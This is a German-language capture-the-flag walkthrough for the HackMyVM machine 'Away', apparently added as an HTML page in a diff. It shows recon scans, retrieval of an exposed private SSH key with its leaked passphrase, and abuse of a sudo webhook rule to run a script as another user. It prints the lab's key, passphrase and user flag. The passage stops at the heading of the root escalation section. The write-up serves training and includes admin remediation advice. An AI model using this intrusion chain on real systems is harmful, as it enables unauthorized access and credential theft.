@@ -1,0 +1,616 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Away - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Away - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <!-- HINWEIS: Klasse 'level-medium' wird verwendet, um GELB gemäß Anforderung zu erzwingen -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle level-medium-circle"> <!-- Zusätzliche Klasse für CSS-Targeting der Kreis-Farbe -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrund wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">vi / cat</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">webhook</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">more</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                 <li><a href="#privilege-escalation-1">Privilege Escalation (tula -> lula via Webhook)</a></li>
+                 <li><a href="#privilege-escalation-2">Privilege Escalation (lula -> root via SSH Key Leak)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`. Dieses Tool sendet ARP-Anfragen, um IP- und MAC-Adressen von Geräten im selben Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `arp-scan` findet erfolgreich ein Zielsystem mit der IP-Adresse `192.168.2.121`. Die zugehörige MAC-Adresse `08:00:27:5c:d5:78` gehört laut OUI-Lookup (PCS Systemtechnik GmbH) zu Oracle VirtualBox, was darauf hindeutet, dass es sich um eine virtuelle Maschine handelt. Dies ist die primäre IP für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP `192.168.2.121` als Ziel für detailliertere Scans (Nmap, etc.) verwenden. Die MAC-Adresse notieren, bestätigt die Virtualisierungsumgebung.<br><strong>Empfehlung (Admin):</strong> Netzwerkmonitoring implementieren, um ARP-Scans zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.121</span>	<span class="command">08:00:27:5c:d5:78</span>	<span class="command">PCS Systemtechnik GmbH</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird gegen die Ziel-IP `192.168.2.121` durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu sammeln.
+                *   `-sS`: SYN-Scan (Stealth).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-T5`: Sehr schnelles Timing (riskant, potenziell ungenau/laut).
+                *   `-sV`: Versionserkennung.
+                *   `-A`: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22 (SSH):** Läuft OpenSSH 8.4p1 (Debian). Die verschiedenen Host-Keys werden angezeigt.
+                *   **Port 80 (HTTP):** Läuft Nginx 1.18.0. Die Webseite hat keinen Titel (`Site doesn't have a title`).
+            Die OS-Erkennung deutet auf ein Linux-System (Kernel 4.x/5.x) hin. Die MAC-Adresse bestätigt VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offenen Ports SSH und HTTP sind die primären Angriffsvektoren. Den Webserver auf Port 80 genauer untersuchen (Verzeichnisse, Dateien, Anwendungen). SSH im Auge behalten für spätere Login-Versuche, falls Benutzerdaten gefunden werden.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur benötigte Ports offen sind. Nginx und OpenSSH aktuell halten und sicher konfigurieren (z.B. SSH mit Key-Authentifizierung und Fail2Ban).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.121 -p-</span></div>
+                    <pre>
+PORT   STATE SERVICE VERSION
+=====================================================================
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 f1:87:03:41:21:12:ef:80:3c:8f:07:2f:8b:3c:6e:2a (RSA)
+|   256 5f:f9:ca:19:0d:74:65:2c:97:4a:36:a4:04:7c:9b:bd (ECDSA)
+|_  256 39:a4:b3:38:94:c5:d2:77:07:a1:dd:b4:2f:0a:5a:44 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:5C:D5:78 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.
+                *   `dir`: Modus für Verzeichnissuche.
+                *   `-u "http://192.168.2.121"`: Ziel-URL.
+                *   `-w ...directory-list-2.3-medium.txt`: Wortliste.
+                *   `-e`: Erweiterte URL-Ausgabe.
+                *   `-x ...`: Lange Liste von Dateiendungen zum Testen.
+                *   `-t 100`: Anzahl der Threads (sehr hoch, kann den Server belasten oder zu Fehlern führen).
+                *   `-s "200,204,301,302,307,401"`: Zeigt nur Ergebnisse mit diesen Statuscodes an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet nur eine einzige Datei: `index.html` mit Status 200 OK. Dies deutet auf eine sehr spartanische Webseite oder eine Single-Page Application hin. Keine offensichtlichen Verzeichnisse oder andere interessante Dateien wurden gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt von `index.html` analysieren (z.B. mit `curl http://192.168.2.121/index.html`). Nach Kommentaren, JavaScript-Code, Links oder Hinweisen auf APIs oder versteckte Funktionalitäten suchen. Evtl. Fuzzing auf Parameter oder andere Verzeichnisse mit spezifischeren Wortlisten versuchen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass keine unnötigen Dateien oder Verzeichnisse über den Webserver erreichbar sind. Directory Listing deaktivieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">gobuster dir -u "http://192.168.2.121"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+==============================================================================================================================
+<span class="command">http://192.168.2.121/index.html</span>           (Status: 200) [Size: 247]
+==============================================================================================================================
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein ASCII-Art-Block wird angezeigt, der einen SSH ED25519 Key-Fingerprint darstellt und den Login-Namen `tula` erwähnt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein starker Hinweis auf einen gültigen Benutzernamen (`tula`) für das System, der wahrscheinlich für SSH verwendet wird. Die Quelle dieses Hinweises ist unklar (vielleicht aus der `index.html` oder einer anderen Informationsquelle, die hier nicht gezeigt wird).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Benutzernamen `tula` für SSH-Login-Versuche verwenden.<br><strong>Empfehlung (Admin):</strong> Keine Benutzernamen oder SSH-Key-Informationen unnötig preisgeben.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies vermutlich aus einer Datei/Webseite stammt -->
+                     <pre>
+Login: <span class="command">tula</span> 
+
++--[ED25519 256]--+
+|  . . =+. .o..   |
+|   + +.+ . .o    |
+|    = + + +  o   |
+|     + B + o  o  |
+|      = S o  .   |
+|     = + o    .  |
+|    + X o    .   |
+|     O O. . . .  |
+|    . E+.. . .   |
++----[SHA256]-----+
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als der vermutete Benutzer `tula` am Zielsystem anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt fehl mit der Meldung `<span class="password">Permission denied (publickey)</span>`. Das bedeutet:
+                1.  Der Benutzer `tula` existiert wahrscheinlich.
+                2.  Passwort-Authentifizierung ist für diesen Benutzer (oder generell) deaktiviert.
+                3.  Es wird ausschließlich Public-Key-Authentifizierung erwartet, und der Angreifer hat (noch) nicht den passenden privaten Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach dem privaten SSH-Schlüssel für den Benutzer `tula` suchen. Mögliche Quellen: Webserver-Verzeichnisse, Konfigurationsdateien, andere Dienste (wie Rsync, falls vorhanden), LFI-Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Gut, dass Passwort-Authentifizierung deaktiviert ist. Key-basierte Authentifizierung ist sicherer, aber die privaten Schlüssel müssen geschützt werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ssh tula@192.168.2.121</span></div>
+                     <pre>
+The authenticity of host '192.168.2.121 (192.168.2.121)' can't be established.
+ED25519 key fingerprint is SHA256:dkQRqegU8A17eOn7ci8TfgVqDJbPWh5SXiJNzKN9QIo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.121' (ED25519) to the list of known hosts.
+<span class="password">tula@192.168.2.121: Permission denied (publickey).</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `ssh-keyscan` wird verwendet, um die öffentlichen SSH-Host-Schlüssel des Zielsystems abzurufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die von Nmap gefundenen Schlüsseltypen (ED25519, RSA, ECDSA) und liefert deren öffentliche Schlüssel im Base64-Format. Dies ist hauptsächlich zur Verifizierung der Host-Identität nützlich und bietet keinen direkten Angriffsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Ausgabe kann ignoriert werden, wenn die Host-Identität bereits durch den vorherigen SSH-Versuch bestätigt wurde.<br><strong>Empfehlung (Admin):</strong> Keine spezifischen Maßnahmen erforderlich, da dies öffentliche Informationen sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ssh-keyscan 192.168.2.121</span></div>
+                    <pre>
+# 192.168.2.121:22 SSH-2.0-OpenSSH_8.4p1 Debian-5
+192.168.2.121 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ64sTDhyY0CptujqKmx1edDrrFKa4XviRxLXFoIfc/8
+# 192.168.2.121:22 SSH-2.0-OpenSSH_8.4p1 Debian-5
+192.168.2.121 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH/1T/RgXcVbn6EgafjjLQhGE4pYKv4ERz1BZB+tVzvwnLhPYTX+yErYrj5V+vrC8Xfw6pHsNV2P9d8ZP74QZoUaPXISyFXbM18Eq2AMqIiSUrZvCCKq6j1q1irldDWfz3fF40uarKY42TMvim2lSXrH61GpwhH3BBmfrPPVy9VdJV2936rhbaiiCh0VME96i1SBXz7VxFl9qwNDjS9Qx6yEZriJ48b9n5CxQhkWUFVWddn/Pk3zBoZ0jgRfRhvShfu5CyvxSld6uy7D07b6nDIAebD8JyHndFBmXiAH1VQV8pk+KuZ0CyqPjLw5zCJWHu22ZSnOeBfV49qADLiguHt+D2yOwDIFTYGChhElCmVcJbdyEXbKFmuMOPAeYsr4LVxJYf39cp0isBegACit4t5y1rOzkX1bE//wvnosZIObL9d1usJAjX5llIY6YhSqFKYXOsJW5zF2p+BBZOUGa65vsvpjp5NvLM3Ik8QkVT3tDNBGPiiTmwGt0LjfHloWE=
+# 192.168.2.121:22 SSH-2.0-OpenSSH_8.4p1 Debian-5
+192.168.2.121 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOYvsbJJWK+RjISNYHrjsKKTmYifa3yZ4AqCSuzfVoyugM1/xJcFSHYnNkp0CZKr6ZolLZ9r1D0QMFWlQZFRSUE= 
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird angezeigt. Sie enthält nun einen Eintrag, der die IP `192.168.2.121` dem Hostnamen `away.hmv` zuordnet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies wurde wahrscheinlich nach den vorherigen Schritten hinzugefügt, um die Ansprache des Ziels über den Namen zu ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Namen `away.hmv` für zukünftige Befehle verwenden.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen möglich/nötig.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">cat /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost 
+<span class="command">192.168.2.121    away.hmv</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt einer Datei namens `id_ed25519.pub` (vermutlich auf dem Angreifer-System im Verzeichnis `/home/cyber/Downloads/`) wird angezeigt. Es handelt sich um einen öffentlichen SSH-Schlüssel im ED25519-Format. Am Ende der Schlüsselzeile steht ein Kommentar: `<span class="password">My passphrase is: Theclockisticking</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Dies ist der öffentliche Teil eines SSH-Schlüsselpaares. Der Kommentar verrät im Klartext die Passphrase (`Theclockisticking`), die zum Schutz des dazugehörigen *privaten* Schlüssels verwendet wird. Dies ist eine massive Sicherheitslücke, da Passphrasen niemals im öffentlichen Schlüssel gespeichert werden sollten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Passphrase `<span class="password">Theclockisticking</span>` notieren. Nun den dazugehörigen privaten Schlüssel (`id_ed25519` ohne `.pub`) finden. Dieser könnte auf dem Webserver liegen oder anderweitig zugänglich sein.<br><strong>Empfehlung (Admin):</strong> SSH-Schlüssel korrekt generieren und verwenden. Passphrasen sicher und getrennt vom Schlüssel aufbewahren. Kommentare in öffentlichen Schlüsseln sollten keine sensiblen Informationen enthalten. Benutzer schulen, Passphrasen nicht in Kommentaren zu speichern.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">cat /home/cyber/Downloads/id_ed25519.pub</span></div>
+                     <pre>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTsYR6Gg1apA+kuSgdtTkrrhhgskSJf  <span class="password">My passphrase is: Theclockisticking</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `curl` wird versucht, eine Datei namens `id_ed25519` vom Webserver unter `http://192.168.2.121/id_ed25519` herunterzuladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Server liefert den Inhalt der Datei, und es handelt sich tatsächlich um einen privaten SSH-Schlüssel (`-----BEGIN OPENSSH PRIVATE KEY-----`). Es ist extrem unsicher, einen privaten Schlüssel direkt über HTTP zugänglich zu machen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den privaten Schlüssel speichern. Da die Passphrase (`Theclockisticking`) aus dem öffentlichen Schlüssel bekannt ist, kann dieser Schlüssel nun verwendet werden, um sich als der Benutzer anzumelden, dem dieser Schlüssel gehört (wahrscheinlich `tula`).<br><strong>Empfehlung (Admin):</strong> **Sofort den privaten Schlüssel vom Webserver entfernen!** Private Schlüssel dürfen niemals über HTTP erreichbar sein. Webserver-Konfiguration überprüfen, um sicherzustellen, dass keine sensiblen Dateien im Web-Root oder anderen zugänglichen Verzeichnissen liegen. Berechtigungen prüfen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://192.168.2.121/id_ed25519"</span></div>
+                     <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA+GY+qad
+MDkU/yMHam3bmdAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTs
+YR6Gg1apA+kuSgdtTkrrhhgskSJfAAAAsAEbt6fRUQfkYGDCdAa/zOBpiUuAV1kGiDs3F1
+gD8y+UxeRdz6gQxbHAY53rE25YN+t1bml5GuNMx99CLApAQCMgeePifFV+t2gRnaMEGRnf
+4u1RfM20X6rRYdKeQKHwrE5b/m4xgKC5FvKfiGESqirQ2XPWZnOfbcNc+czsut8t8v+zfl
+kYo1mO1M4Va9i+OipgnoOJkdNB+mdx2f7YE0lWoHdt/7KVG5eDB90WrJZF
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der heruntergeladene private Schlüssel wird vermutlich lokal als `id_rsa` gespeichert (obwohl es ein ed25519-Schlüssel ist - Dateiname ist hier nicht entscheidend). Die Berechtigungen werden mit `chmod 600` korrekt gesetzt, damit SSH den Schlüssel akzeptiert. Anschließend wird versucht, sich als `tula` mit diesem Schlüssel (`-i id_rsa`) und der bekannten Passphrase (`Theclockisticking`) anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Nach Eingabe der korrekten Passphrase wird die SSH-Verbindung als Benutzer `tula` erfolgreich hergestellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access erfolgreich! Nun als `tula` auf dem System enumerieren, insbesondere `sudo -l` prüfen und die User-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Den kompromittierten SSH-Schlüssel sofort für ungültig erklären (aus `authorized_keys` entfernen) und einen neuen, sicheren Schlüssel generieren. Die Ursache für die Preisgabe des privaten Schlüssels und der Passphrase untersuchen und beheben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">chmod 600 id_rsa</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ssh tula@away.hmv -i  id_rsa</span></div>
+                     <pre>
+The authenticity of host 'away.hmv (192.168.2.121)' can't be established.
+ED25519 key fingerprint is SHA256:dkQRqegU8A17eOn7ci8TfgVqDJbPWh5SXiJNzKN9QIo.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:59: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'away.hmv' (ED25519) to the list of known hosts.
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies die Passphrase-Eingabe ist -->
+                     <pre>
+Enter passphrase for key 'id_rsa': <span class="password">Theclockisticking</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies die SSH-Login-Nachricht ist -->
+                     <pre>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 17 10:28:31 2022 from 192.168.1.51
+<span class="password">tula@away:~$</span> 
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-1">
+            <h2>Privilege Escalation (tula -> lula via Webhook)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `tula` werden die `sudo`-Rechte überprüft und die User-Flag ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `sudo -l`: Zeigt eine interessante Regel: `User tula may run the following commands on away: (lula) NOPASSWD: /usr/bin/webhook`. Der Benutzer `tula` darf das Programm `/usr/bin/webhook` als Benutzer `lula` ohne Passwort ausführen. Dies ist ein klarer Vektor für Privilegieneskalation zu `lula`.
+                *   `cat user.txt`: Liest erfolgreich die User-Flag: `<span class="password">HMVDULEMISPLCYDKEG</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notieren. Die `sudo`-Regel für `/usr/bin/webhook` ausnutzen, um Befehle als Benutzer `lula` auszuführen oder eine Shell als `lula` zu erhalten. Recherchieren, wie `webhook` funktioniert und wie es für RCE missbraucht werden kann (oft durch Definition von Hooks in einer Konfigurationsdatei).<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln überprüfen. Die Ausführung von potenziell gefährlichen Programmen wie `webhook` über `sudo` vermeiden oder stark einschränken. Sicherstellen, dass der Benutzer `lula` nur minimale Rechte hat.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt als tula -->
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for tula on away:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tula may run the following commands on away:
+    <span class="password">(lula) NOPASSWD: /usr/bin/webhook</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">cat user.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">HMVDULEMISPLCYDKEG</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Vorbereitung und Ausführung des Webhook-Exploits.
+                *   `nmap 192.168.2.121 -p9000`: Überprüft, ob Port 9000 (Standardport für Webhook) offen ist. Er ist offen (`cslistener` - oft ein Platzhaltername für unbekannte Dienste auf diesem Port).
+                *   `mkdir /tmp/webhook`, `nano hooks.json`, `cp hooks.json webhook/`: Erstellt ein Arbeitsverzeichnis und eine Konfigurationsdatei (`hooks.json`) für Webhook. Der Inhalt wird nicht gezeigt, aber er definiert wahrscheinlich einen Hook, der einen Befehl ausführt.
+                *   `nano /dev/shm/exploit.sh`, `chmod 777 /dev/shm/exploit.sh`, `chmod +x /dev/shm/exploit.sh`: Erstellt ein Shell-Skript (`exploit.sh`) im speicherbasierten Dateisystem `/dev/shm` (oft weniger restriktiv als `/tmp`) und macht es ausführbar. Der Inhalt wird später gezeigt (Reverse Shell).
+                *   `cd /tmp/`: Wechselt in das temporäre Verzeichnis.
+                *   `sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose`: Startet den Webhook-Dienst als Benutzer `lula` über die `sudo`-Regel. `-hooks hooks.json` lädt die erstellte Konfiguration, `-verbose` zeigt Log-Meldungen an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies sind die Schritte zur Vorbereitung der Privilegieneskalation via Webhook. Der Webhook-Dienst wird als `lula` gestartet und lauscht auf Port 9000. Er ist so konfiguriert (`hooks.json`), dass er bei Auslösung eines bestimmten Hooks (hier `redeploy-webhook`) das Skript `/dev/shm/execute.sh` (Name im Log, nicht `exploit.sh`?) ausführt. Die Log-Meldungen zeigen, dass der Dienst erfolgreich startet und auf Anfragen wartet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hook über eine HTTP-Anfrage an `http://localhost:9000/hooks/redeploy-webhook` (oder von außen, falls erreichbar) auslösen, um das `/dev/shm/execute.sh`-Skript als `lula` auszuführen.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel für Webhook entfernen. Dienste wie Webhook sicher konfigurieren, Authentifizierung für Hooks implementieren und sicherstellen, dass sie keine beliebigen Befehle ausführen können.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Prompt des Angreifers -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap 192.168.2.121 -p9000</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 23:14 CEST
+Nmap scan report for away.hmv (192.168.2.121)
+Host is up (0.00015s latency).
+
+PORT     STATE SERVICE
+<span class="command">9000/tcp open  cslistener</span>
+</pre>
+                  </div>
+            </div>
+            <!-- Befehle zur Vorbereitung -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">mkdir webhook</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">nano hooks.json</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">cp hooks.json webhook/</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">nano /dev/shm/exploit.sh</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">chmod 777 /dev/shm/exploit.sh</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">chmod +x /dev/shm/exploit.sh</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:~$ <span class="command">cd /tmp/</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <!-- Starten des Webhooks -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span></div>
+                     <pre>
+[webhook] 2022/10/05 23:02:59 version 2.6.9 starting
+[webhook] 2022/10/05 23:02:59 setting up os signal watcher
+[webhook] 2022/10/05 23:02:59 attempting to load hooks from hooks.json
+[webhook] 2022/10/05 23:02:59 found 1 hook(s) in file
+[webhook] 2022/10/05 23:02:59 	loaded: redeploy-webhook
+[webhook] 2022/10/05 23:02:59 serving hooks on http://0.0.0.0:9000/hooks/{id}
+[webhook] 2022/10/05 23:02:59 os signal watcher ready
+<span class="password">[webhook] 2022/10/05 23:20:52 [6f2b2c] redeploy-webhook hook triggered successfully</span>
+[webhook] 2022/10/05 23:20:52 Completed 200 OK in 49.321µs
+<span class="password">[webhook] 2022/10/05 23:20:52 [6f2b2c] executing /dev/shm/execute.sh (/dev/shm/execute.sh) with arguments ["/dev/shm/execute.sh"] and environment [] using /tmp/webhook as cwd</span>
+</pre> <!-- Die letzten beiden Zeilen erscheinen erst, nachdem der Hook ausgelöst wurde -->
+                  </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-2">
+             <h2>Privilege Escalation (lula -> root via SSH Key Leak)</h2>
+            <!-- Eingefügt: Abschnitt für die Reverse Shell als lula -->
